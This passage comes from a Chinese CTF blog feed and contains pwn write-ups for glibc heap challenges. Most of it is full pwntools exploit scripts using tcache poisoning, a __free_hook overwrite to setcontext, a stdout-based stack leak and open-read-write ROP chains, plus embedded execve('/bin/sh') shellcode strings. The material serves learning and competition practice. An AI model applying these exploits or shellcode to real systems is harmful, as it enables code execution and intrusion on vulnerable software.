<span class="comment"># 15</span></span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">leak_stack = uu64()</span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>)</span><br><span class="line">fake_addr = leak_stack - <span class="number">0x110</span></span><br><span class="line">lg(<span class="string">&#x27;fake_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># make rop</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">fake_next = <span class="built_in">next</span> ^ fake_addr</span><br><span class="line">edit(<span class="number">8</span>, <span class="number">9</span>, p64(fake_next))</span><br><span class="line">add() <span class="comment"># 16</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add() <span class="comment"># 17</span></span><br><span class="line"></span><br><span class="line">owr = <span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">owr = owr.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">owr += p64(pop_rdi) + p64(fake_addr) + p64(op)</span><br><span class="line">owr += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(fake_addr + <span class="number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="number">0x30</span>)*<span class="number">2</span> + p64(rd)</span><br><span class="line">owr += p64(pop_rdi) + p64(fake_addr + <span class="number">0x100</span>) + p64(pt)</span><br><span class="line">edit(<span class="built_in">len</span>(owr), <span class="number">17</span>, owr)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h3><p>这道题目是libc2.33的，还未禁用hook函数，我们可以覆盖hook函数为libc中的setcontext，实现owr。</p>
<blockquote>
<p>参考文章：<a href="https://blog.csdn.net/A951860555/article/details/118268484">(8条消息) pwn题堆利用的一些姿势 – setcontext___lifanxin的博客-CSDN博客_setcontext</a></p>
</blockquote>
<p>在这里可以用IDA查看setcontext中的内容，这里我们需要的汇编片段的偏移是0x3d，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000052970 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:0000000000052974 57                            push    rdi</span><br><span class="line">.text:0000000000052975 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]       ; nset</span><br><span class="line">.text:000000000005297C 31 D2                         xor     edx, edx              ; oset</span><br><span class="line">.text:000000000005297E BF 02 00 00 00                mov     edi, 2                ; how</span><br><span class="line">.text:0000000000052983 41 BA 08 00 00 00             mov     r10d, 8               ; sigsetsize</span><br><span class="line">.text:0000000000052989 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:000000000005298E 0F 05                         syscall                       ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000052990 5A                            pop     rdx</span><br><span class="line">.text:0000000000052991 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000052997 0F 83 22 01 00 00             jnb     loc_52ABF</span><br><span class="line">.text:0000000000052997</span><br><span class="line">.text:000000000005299D 48 8B 8A E0 00 00 00          mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:00000000000529A4 D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:00000000000529A6 0F AE 92 C0 01 00 00          ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:00000000000529AD 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]	# 嘿，我在这里！！</span><br><span class="line">.text:00000000000529B4 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]</span><br><span class="line">.text:00000000000529BB 48 8B 6A 78                   mov     rbp, [rdx+78h]</span><br><span class="line">.text:00000000000529BF 4C 8B 62 48                   mov     r12, [rdx+48h]</span><br><span class="line">.text:00000000000529C3 4C 8B 6A 50                   mov     r13, [rdx+50h]</span><br><span class="line">.text:00000000000529C7 4C 8B 72 58                   mov     r14, [rdx+58h]</span><br><span class="line">.text:00000000000529CB 4C 8B 7A 60                   mov     r15, [rdx+60h]</span><br><span class="line">.text:00000000000529CF 64 F7 04 25 48 00 00 00 02 00+test    dword ptr fs:48h, 2</span><br><span class="line">.text:00000000000529CF 00 00</span><br><span class="line">.text:00000000000529DB 0F 84 B5 00 00 00             jz      loc_52A96</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.text:0000000000052A96                               loc_52A96:                    ; CODE XREF: setcontext+6B↑j</span><br><span class="line">.text:0000000000052A96 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000052A9D 51                            push    rcx</span><br><span class="line">.text:0000000000052A9E 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000052AA2 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000052AA6 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000052AAD 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000052AB1 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000052AB5 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000052AB5                               ; &#125; // starts at 52970</span><br><span class="line">.text:0000000000052ABC                               ; __unwind &#123;</span><br><span class="line">.text:0000000000052ABC 31 C0                         xor     eax, eax</span><br><span class="line">.text:0000000000052ABE C3                            retn</span><br><span class="line">.text:0000000000052ABE</span><br></pre></td></tr></table></figure>

<p>需要注意的是：这里和上面给的参考文章有区别，一是偏移不一样，另外最重要的是，本人给出的汇编是以rdx为基础去找偏移，而参考文章是以rdi为基础去找偏移，所以我们需要一段gadget将rdi中的值转化为rdx，并且我们还需要控制程序执行流执行setcontext。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary libc.so.6 --only &#x27;mov|call&#x27; | grep rdx</span><br><span class="line">找到以下一个片段：</span><br><span class="line">mov rdx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure>

<p>可以首先覆盖hook函数为这一段gadget，然后通过控制malloc和free堆块其中内容的布局，使得下一次<code>call qword ptr [rdx + 0x20]</code>的时候能够执行我们的setcontext，同时基于rdx布置好我们的orw，尤其要注意rsp的变化。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slibc</span>(<span class="params">leak_name, leak_addr, flag = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        libc_base = leak_addr - libc.symbols[<span class="built_in">str</span>(leak_name)]</span><br><span class="line">        sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        libcsch = LibcSearcher(<span class="built_in">str</span>(leak_name), leak_addr)</span><br><span class="line">        libc_base = leak_addr - libcsch.dump(<span class="built_in">str</span>(leak_name))</span><br><span class="line">        sys_addr = libc_base + libcsch.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        bin_sh = libc_base + libcsch.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [sys_addr, bin_sh]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># set solib-search-path /home/zyy/glibc-all-in-one/libs/2.33-0ubuntu5_amd64/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, index, context</span>):</span><br><span class="line">	sla(<span class="string">&quot;Choice: &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&quot;Idx: &quot;</span>, <span class="built_in">str</span>(index))	</span><br><span class="line">	sla(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))	</span><br><span class="line">	sa(<span class="string">&quot;Content: &quot;</span>, context)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fill tcache</span></span><br><span class="line">add() <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add() <span class="comment"># 1 - 7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">9</span>, <span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>)	<span class="comment"># LOWORD(fd)=0x00,fill fd-&gt;LOWORD(bk)</span></span><br><span class="line">show(<span class="number">0</span>)		<span class="comment"># leak bk</span></span><br><span class="line">libc_base = uu64() - <span class="number">0x1e0c61</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">op = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">rd = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pt = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;op&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;rd&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;pt&#x27;</span>)</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">setcontext += <span class="number">61</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext&#x27;</span>)</span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000028a55</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002a4cf</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x00000000000c7f32</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000026699</span></span><br><span class="line">magic = libc_base + <span class="number">0x000000000014a0a0</span></span><br><span class="line">lg(<span class="string">&#x27;magic&#x27;</span>)</span><br><span class="line"><span class="comment"># mov rdx, dword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	add()	<span class="comment"># 8 - 13</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"><span class="built_in">next</span> = u64(sh.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&#x27;next&#x27;</span>)</span><br><span class="line">heap_base = <span class="built_in">next</span> &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># change free_hook-&gt;magic</span></span><br><span class="line">fake_next = <span class="built_in">next</span> ^ free_hook</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="number">2</span>, p64(fake_next))</span><br><span class="line">add() <span class="comment"># 14</span></span><br><span class="line">add() <span class="comment"># 15</span></span><br><span class="line">pld = p64(magic)*<span class="number">2</span></span><br><span class="line">edit(<span class="built_in">len</span>(pld), <span class="number">15</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="comment"># orw </span></span><br><span class="line">flag_addr = heap_base + <span class="number">0x4c0</span></span><br><span class="line">lg(<span class="string">&#x27;flag_addr&#x27;</span>)</span><br><span class="line">owr = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span> + p64(<span class="number">0</span>)    <span class="comment"># push rcx-&gt;overflow p64(0)</span></span><br><span class="line">owr += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(op)</span><br><span class="line">owr += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap_base + <span class="number">0x800</span>) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(rd)</span><br><span class="line">owr += p64(pop_rdi) + p64(heap_base + <span class="number">0x800</span>) +p64(pt)</span><br><span class="line">edit(<span class="built_in">len</span>(owr), <span class="number">2</span>, owr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># setcontext</span></span><br><span class="line">dest = heap_base + <span class="number">0x5d0</span> - <span class="number">0x20</span></span><br><span class="line">pld = p64(setcontext) + p64(dest)       </span><br><span class="line">pld = pld.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pld += p64(flag_addr + <span class="number">0x10</span>)   <span class="comment"># rsp-&gt;orw</span></span><br><span class="line">pld += p64(ret)     <span class="comment"># rcx-&gt;ret</span></span><br><span class="line">edit(<span class="built_in">len</span>(pld), <span class="number">3</span>, pld)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h2><p>题目只能对一个堆块使用uaf，并且最大的chunk大小为0xa0，所以难点在于怎样制造堆块的重叠进行后续的利用。由于这道题没有edit功能，所以我们想要制造堆块重叠，那可以使得unsortedbin和tcathe中分别存在同一堆块（也可以是有物理上交叉的堆块），这样当我们从unsortedbin中取出堆块，就可以对释放进tcathe中的交叉堆块进行写fd的操作。</p>
<p>如何制造以上的效果？如果我们不进行任何操作就对一个被释放在unsortedbin中的chunk进行free，即使能将chunk放入tcache，也会导致unsortedbin的链表被破坏导致程序出错，所以我们可以采用堆块合并的方式，使得可以uaf的指针影藏在合并的堆块中，这样再次free时就不会出错，如下图所示：</p>
<p><img src="https://s1.ax1x.com/2022/10/16/xBmOc4.png" alt="uaf"></p>
<p>这里还要注意的就是，我们只能使用一次show的功能，所以我们要利用IO(stdout)来进行泄露栈地址，最后进行orw。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;Please input content: &#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Please input idx: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0-6</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">magic(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x1ecbe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;environ&#x27;</span>)</span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;stdout&#x27;</span>)</span><br><span class="line">op = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">rd = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">wt = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pt = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create overlap</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">pld = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(stdout)</span><br><span class="line">add(<span class="number">0x90</span>, pld)          <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># modify stdout</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 3</span></span><br><span class="line">pld = p64(<span class="number">0xfbad1800</span>)   <span class="comment"># flags</span></span><br><span class="line">pld += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">pld += p64(environ)     <span class="comment"># _IO_write_base</span></span><br><span class="line">pld += p64(environ + <span class="number">8</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">add(<span class="number">0x80</span>, pld)          <span class="comment"># 4</span></span><br><span class="line">leak_stack = uu64()</span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># modify ret_addr</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">ret = leak_stack - <span class="number">0x128</span></span><br><span class="line">lg(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">pld = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(ret)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">0x90</span>, pld)</span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(ret) + p64(p_rsi_r) + p64(<span class="number">0</span>) + p64(op)</span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">3</span>) + p64(p_rsi_r) + p64(ret + <span class="number">0x100</span>) + p64(p_rdx_r) + p64(<span class="number">0x30</span>) + p64(rd)</span><br><span class="line">orw += p64(p_rdi_r) + p64(ret + <span class="number">0x100</span>) + p64(pt)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">0x80</span>, orw)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>Sandbox</title>
    <url>/2022/07/16/Pwn/Sandbox/</url>
